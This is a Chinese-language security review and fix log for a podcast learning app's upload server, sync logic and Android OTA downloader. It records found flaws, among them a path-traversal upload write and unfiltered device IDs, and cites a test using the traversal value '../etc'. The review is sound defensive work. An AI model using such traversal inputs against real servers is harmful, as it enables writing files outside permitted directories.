### 已重点核对、确认无问题的项

- **SQL 注入面**：全部用户输入经绑定参数；动态 SQL 仅拼接白名单列名与常量片段，无注入点。
- **PBKDF2/JWT/管理员 token**：200k 迭代 sha256、独立盐、`compare_digest`；JWT 过期校验与用户存在性/禁用逐请求校验。
- **FileProvider 安全**：非导出、URI 临时授权、固定只读文件、忽略 URI path，无目录遍历面。
- **.part→rename**：存在且 rename 失败有 copyTo 兜底；取消时删除半成品（但受 I3 竞态影响）。
- **大文件上传内存**：1MB 分块流式写盘与增量哈希，无整文件驻留；152MB 实测通过。
- **资源释放**：下载 StreamSubscription、搜索 Timer 均有取消；dio 无刷新拦截器递归；服务端短连接全部 finally 关闭，WAL/外键每次连接启用。
- **零新增依赖/双 SDK 兼容**：requirements 未改、pubspec 仅版本变更、无 withValues、OH fork 3.22 analyze 0 error。
- **24h 节流与 mandatory 例外**：仅非强制受节流影响，强制更新每次启动可再弹，手动检查绕过节流。

---

## 附：评审中实际执行的验证

1. `python server/tests/run_all.py` → 7/7 模块 PASS（exit 0）。
2. 标准版 Flutter 3.47.5：`flutter test`（全量）→ 83/83 All tests passed。
3. OH fork Flutter 3.22.0（Dart 3.4）：`flutter analyze` → 0 error / 1 warning（B1）/ 27 info（均 withOpacity）。
4. TestClient 动态实证：S1 路径穿越写盘成功、I1 脏版本致 latest 500、坏 JSON body 实际返回 422（此项无问题）、CORS 预检全放行、恶意 device_id 原样落库。
5. 证据文件核对：`.tools/app-shots/server_live_e2e_34passed.txt`（live 34 项）、`app/.tools_build_out.txt`（APK 构建成功）、`server/data/releases/android-0.4.1-5-*.apk`（152,158,299 字节）。

---

## ⑥ 修复闭环记录（2026-10-01）

| 编号 | 修复内容 | 关键落点 | 复测证据 |
|---|---|---|---|
| S1 | 上传白名单化：platform∈{android,ohos}、channel∈{stable,beta,alpha}、version `^\d+\.\d+\.\d+$`、buildNo≥0（非法 422）；落盘名 `{platform}-{version}-{buildNo}-{uuid8}.apk`，写盘异常 unlink 半成品；latest 对 platform/channel/current 同样 422 | [routes_releases.py](file:///d:/ai/prj/trae/HuaWei/MyLangLean/server/app/api/routes_releases.py) | test_upload_field_validation（含 `../etc`、1.0、-1 等 6 个非法用例）+ latest 缺失/非法 current 422，全过 |
| I1/B9 | `parse_version` 永不抛异常，脏行过滤；`has_update` 解析失败返回 False | [db.py](file:///d:/ai/prj/trae/HuaWei/MyLangLean/server/app/core/db.py) | run_all 7/7 |
| I2 | 订阅同步重写为**待同步操作队列**（KV key `subscriptions.pending`：`{id,sub,t}`，last-write-wins）：sync 先重放 PUT/DELETE（404 订阅目标记为 gone 本地丢弃），拉取远端后合并时排除“待删除/已确认删除”id，离线退订不再被并集装回；local-only 项回推 | [synced_library_repository.dart](file:///d:/ai/prj/trae/HuaWei/MyLangLean/app/lib/data/repositories/synced_library_repository.dart) | 新增 6 条用例：队列持久化、重放出队、**退订防复活**、恢复后 DELETE 收敛、404 丢弃、未登录入队登录后回放，全过 |
| I3/I7/B4 | Kotlin 下载器重写：单调会话 token（start 先中断 join 旧 worker，cancel 使 token 失效+断连）；`.part` 按 release id 隔离；`Range: bytes=<len>-` 续传（206 校验 Content-Range 起点，200 截断重下）；rename 前整文件 SHA-256 与 release.sha256 比对，不一致删包报错；事件按 token 门控 | [MlUpdaterPlugin.kt](file:///d:/ai/prj/trae/HuaWei/MyLangLean/app/android/app/src/main/kotlin/com/mylanglean/app/MlUpdaterPlugin.kt)；Dart 侧 listen 参数改 `{url,sha256,id}`（兼容裸 URL），ReleaseInfo 增加 id | [updater_service.dart](file:///d:/ai/prj/trae/HuaWei/MyLangLean/app/lib/pal/updater_service.dart)；APK 构建通过；live release id=4 服务端 206/sha 已核（真机端校验待设备） |
| I4 | 强制更新下载中隐藏「取消下载」（改提示文案）、失败态仅留「重试」、PopScope 禁止返回关闭 | [update_flow.dart](file:///d:/ai/prj/trae/HuaWei/MyLangLean/app/lib/features/update/update_flow.dart) | 新增 widget 用例「mandatory download cannot be cancelled, even after failure」 |
| I5 | 全部业务 detail 中文化（deps/me/catalog/admin/quota/transcriptions/releases） | 上述路由文件 | run_all 7/7（无旧英文断言残留） |
| I6 | `esc()` 补单引号转义；DeviceLoginIn device_id 白名单 `^[A-Za-z0-9._:\-]{1,128}$`；管理台响应加 CSP/nosniff/Referrer-Policy/no-store | [models.py](file:///d:/ai/prj/trae/HuaWei/MyLangLean/server/app/models.py)、main.py | run_all 7/7 |
| I8 | ensureSession 对 403 同 401 清 token 降游客，403 中文消息写入一次性 `auth.notice`，home_shell 启动后 SnackBar 提示 | [synced_auth_repository.dart](file:///d:/ai/prj/trae/HuaWei/MyLangLean/app/lib/data/repositories/synced_auth_repository.dart)、[home_shell.dart](file:///d:/ai/prj/trae/HuaWei/MyLangLean/app/lib/core/home_shell.dart) | 新增 403 降级+一次性 notice 用例 |
| B1 | 未使用变量已随队列测试重写消除 | synced_repositories_test.dart | analyze 0 warning |
| B2 | `version_utils.dart` 全文件为死代码且 tie-break 与服务端不一致——整文件连同测试删除（版本判定只认服务端） | lib/core（删除） | analyze/test 全绿 |
| B3 | CORS 可配置：`MLL_CORS_ORIGINS`（逗号分隔，默认 `*`） | config.py、main.py | smoke 通过 |
| B5 | 发现/单集缓存改信封 `{ts, content_version, items}`，兼容旧裸列表；MlApi 记录 lastCatalogVersion | [fallback_catalog_repository.dart](file:///d:/ai/prj/trae/HuaWei/MyLangLean/app/lib/data/repositories/fallback_catalog_repository.dart)、ml_api.dart | 既有缓存用例全过 |
| B6 | register 捕获 sqlite3.IntegrityError → 409 中文 | routes_auth.py | live「重复邮箱注册 409」 |
| B7 | featured size 100→200 | ml_api.dart | — |
| B8 | 订阅列表默认过滤下架播客（管理员查看传 include_unpublished=True）；新增 `GET /admin/podcasts`（含下架），管理台据此显示真实上下架状态与按钮 | db.py、routes_admin.py、管理台 | 浏览器实测：下架后公开搜索 items=0，上架后 items=1 |
| B10 | 资料库「播客订阅」Tab 加 RefreshIndicator，下拉触发 syncSubscriptions | [library_page.dart](file:///d:/ai/prj/trae/HuaWei/MyLangLean/app/lib/features/library/library_page.dart) | analyze 全绿 |
| B11 | JWT payload 用 payload.get("sub")，缺失即 401 | deps.py | test_auth 全过 |
| B13 | 搜索 LIKE 加 ESCAPE 并转义 `\ % _` | db.py | test_catalog 全过 |
| B14 | 管理台改名限 64 字符，越界 422 | routes_admin.py | test_admin 全过 |
| B15 | `.gitignore` 增加 `server/data/` | .gitignore | — |

### 回归证据（修复后复跑）

1. 服务端：`tests/run_all.py` → **7/7 模块 PASS**（test_releases 由 5 用例增至 6 用例）。
2. live E2E：`.tools_e2e_live.py` → **34/34 PASS**（uvicorn 已重启加载新代码；含禁用 403、重新启用、Range 206、sha256 一致、重复注册 409）。
3. 管理台浏览器实测：独家频道「下架」后状态/按钮翻转且公开 API items=0；「上架」后恢复已上架且 items=1（双次真实点击，非仅 TestClient）。
4. App：`flutter analyze` → 0 error / 0 warning / 24 info（均为既有 withOpacity/radio 基线，删除死代码后较原 25 条再少 1）；`flutter test` → **All tests passed!**（新增 I2×6、I4×1、I8×1，删除 version_utils 组）。
5. debug APK 重建：168,789,563 字节，sha256 前缀 `257a6914c799795c`；已发布 OTA **release id=4（0.4.1+5 stable）**，latest 指向 id=4，206/Content-Range/Accept-Ranges 实测正确，服务端 sha 与本地 APK 一致。
6. **真机全链路闭环（2026-10-01，HBN-AL00 / Android 12 / 1260×2844，设备 2MN0224730027764，adb reverse 8000）**：

| 环节 | 结果 | 证据 |
|---|---|---|
| d1 装机/冷启动 | 覆盖安装 0.4.0+4 debug 包成功，冷启动发现页加载服务端独家内容 | `.tools/app-shots/01-02` |
| d2 游客态 | pm clear 后我的页「连接状态：在线」、服务器 http://127.0.0.1:8000、0/100 分钟额度 | `.tools/app-shots/03` |
| d3 注册/订阅 | 注册新账号并登录成功；搜索 1790849761 精确命中→详情页订阅按钮「订阅」→「已订阅」；admin API 核对 sub_count=1；资料库「播客订阅」Tab 显示频道 | `.tools/app-shots/13_subtab.png` |
| d4 禁用降级 | 禁用后冷启动**立即**弹 SnackBar「账号已被禁用，请联系管理员」；prefs.json 落盘 guest JWT/isGuest=true/email 清空/notice 已消费；我的页刷新为游客态；重新启用后登录恢复 | `19_disabled_snack.png` |
| d5 离线退订 | 移除 adb reverse 后点退订：本地立即消失、`subscriptions.pending=[{id,sub:false}]`、服务端 sub_count 仍=1；恢复网络下拉同步：队列清空、sub_count=0、频道不复活（随后在线重新订阅 sub_count=1） | prefs 快照 7/8 |
| d6 OTA | 检查更新弹「发现新版本 0.4.1」(161.0 MB+notes)；Kotlin 插件下载 152,185,771 字节完整；run-as `sha256sum cache/mll-update.apk` = `4ea8b470…0b5d8d`，与 release 记录逐位一致；系统安装器成功唤起（华为额外要求锁屏 PIN + 勾选风险确认框，属设备安全策略）；覆盖安装后 UI 自报 0.4.1、登录态保留；latest 对 0.4.1+5 返回 `has_update:false` | `20_ota_dialog.png`、`21_installer.png` |
| d7 云端恢复 | pm clear→游客冷启→重登 dev 账号→资料库订阅 Tab **自动恢复**独家频道；prefs.json subscriptions=1 / pending=0（云端拉取恢复而非待同步队列） | `22_cloud_restore.png` |

**真机环节新发现并修复的两个缺陷（同日闭环）**：

- **R1 KvStore 启动期并发写竞态**：旧实现所有写共用固定 `prefs.json.tmp` 且无串行化，ensureSession 启动扇出（set notice→remove token→guest 落盘等）与其它启动写交错时 tmp 写/rename 乱序抛异常，导致 403 降级链路中断（token 未清、游客登录未执行）。修复为**单调序号写链**：同步快照→唯一 tmp `prefs.json.tmp.<seq>`→`Future` 链串行 await 写盘(flush)+rename，失败清理 tmp。见 [kv_store.dart](file:///d:/ai/prj/trae/HuaWei/MyLangLean/app/lib/data/kv_store.dart)；新增 2 条并发用例（200 键并发写不丢值、remove 后不被陈旧写复活、无 tmp 残留）。
- **R2 notice/账号态时序**：notice 于首帧后写入，home_shell 只在 postFrame 消费一次会错过；且 profile 用 `read` 不响应会话变化。修复：SyncedAuthRepository 增加 broadcast `notices` / `accountChanges` 流与幂等 `sessionReady`（多次 ensureSession 只执行一次），401/403 统一走 `_downgradeToGuest()`（先切内存态、remove 失败不阻断、guest 登录统一发事件）；home_shell 订阅两流并以 sessionReady.then 兜底 consumeNotice；新增 `accountRefreshProvider`，我的页 watch 刷新。见 [synced_auth_repository.dart](file:///d:/ai/prj/trae/HuaWei/MyLangLean/app/lib/data/repositories/synced_auth_repository.dart)、[home_shell.dart](file:///d:/ai/prj/trae/HuaWei/MyLangLean/app/lib/core/home_shell.dart)、[providers.dart](file:///d:/ai/prj/trae/HuaWei/MyLangLean/app/lib/data/providers.dart)。
- 版本常量双写点统一：[constants.dart](file:///d:/ai/prj/trae/HuaWei/MyLangLean/app/lib/core/constants.dart) 与 pubspec.yaml 同步升至 **0.4.1+5**（OTA 包与自报版本一致）。
- 修复后回归：`flutter analyze` 0 error / 0 warning / 24 info（基线不变）；`flutter test` **82/82 All tests passed**（新增 KvStore×2）。服务端 release 记录最终为 **id=6（0.4.1+5 stable，152,185,771 字节，sha256 `4ea8b470e207457dd9f8424468075a0a46b4eb66d5257734b0cffa20ef0b5d8d`）**。
